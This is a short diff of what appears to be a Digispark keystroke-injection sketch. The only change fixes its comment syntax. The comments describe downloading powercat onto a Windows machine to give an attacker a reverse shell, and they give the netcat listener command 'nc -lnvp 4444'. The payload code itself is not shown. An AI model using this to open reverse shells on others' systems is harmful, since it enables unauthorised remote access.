@@ -1,5 +1,5 @@
-/Execute a netcat/powercat reverse shell by downloading powercat on the windows system and giving attacker a reverse shell
-/ on attacker machine write nc -lnvp 4444
+//Execute a netcat/powercat reverse shell by downloading powercat on the windows system and giving attacker a reverse shell
+// on attacker machine write nc -lnvp 4444
 #include "DigiKeyboard.h"
 
 void setup() {
